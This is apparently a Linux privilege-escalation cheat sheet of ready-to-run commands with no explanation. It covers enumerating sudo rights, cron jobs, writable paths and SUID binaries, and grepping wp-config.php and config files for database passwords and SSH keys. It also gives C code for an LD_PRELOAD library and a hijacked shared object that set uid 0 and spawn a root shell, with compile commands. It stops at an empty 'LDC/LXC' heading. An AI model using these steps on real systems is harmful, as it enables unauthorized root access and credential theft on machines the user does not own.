List current processes:
```shell
ps au
```

List user's privileges:
```shell
sudo -l
```

List cron jobs:
```shell
ls -la /etc/cron.daily/
```

List file systems and additional drives:
```shell
lsblk
```

Find writable directories:
```shell
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Find writable files:
```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

# Kernel Exploit
---
Compile exploit:
```shell
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```

# Screen
---
Get screen version:
```shell
screen -v
```

# CronJob Abuse
---
Check if cronjob is running:
```shell
./pspy64 -pf -i 1000
```

# Special Permissions
---
Find suid binaries:
```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Find setguid binaries:
```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

# Searching for Credentials
---
Searching for wordpress credentials in wp_config:
```shell
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

Find credentials in webroot:
```shell
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Check for ssh keys in .ssh:
```shell
ls ~/.ssh
```

# Shared Libraries
---
List shared objects with ldd:
```shell
ldd /bin/ls
```

LD_PRELOAD exploit example:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Compile LD_PRELOAD example:
```shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

# Shared Object Hijacking
---
Exploiting vulnerable function in object example:
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

Compile exploit:
```shell
gcc src.c -fPIC -shared -o /development/libshared.so
```

# LDC/LXC
---
